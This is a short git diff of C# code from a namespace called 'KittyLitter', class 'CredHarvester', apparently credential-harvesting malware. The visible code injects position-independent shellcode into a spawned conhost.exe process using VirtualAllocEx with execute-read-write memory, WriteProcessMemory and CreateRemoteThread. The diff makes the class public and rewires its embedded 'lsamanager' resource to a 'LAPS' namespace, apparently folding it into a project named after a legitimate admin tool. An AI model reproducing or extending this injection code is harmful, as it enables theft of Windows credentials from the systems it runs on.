@@ -7,7 +7,7 @@ using System.IO;
 
 namespace KittyLitter
 {
-    class CredHarvester
+    public class CredHarvester
     {
         public static void Start()
         {
@@ -19,9 +19,9 @@ namespace KittyLitter
                     uint bytesWritten = 0;
                     sacProcess = new Safety.ProcessWithAnonymousPipeIO("C:\\Windows\\System32\\conhost.exe", "0x4");
                     var hProcess = sacProcess.hProcess;
-                    IntPtr ep = Kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, (ulong)Properties.Resources.lsamanager.Length, Kernel32.AllocationType.Commit, Kernel32.MemoryProtection.ExecuteReadWrite);
+                    IntPtr ep = Kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, (ulong)LAPS.Properties.Resources.lsamanager.Length, Kernel32.AllocationType.Commit, Kernel32.MemoryProtection.ExecuteReadWrite);
                     byte[] pic = Helpers.GetPIC();
-                    if (Kernel32.WriteProcessMemory(hProcess, ep, pic, (uint)Properties.Resources.lsamanager.Length, out bytesWritten))
+                    if (Kernel32.WriteProcessMemory(hProcess, ep, pic, (uint)LAPS.Properties.Resources.lsamanager.Length, out bytesWritten))
                     {
                         IntPtr threadId = IntPtr.Zero;
                         var crt = Kernel32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, ep, IntPtr.Zero, 0, threadId);
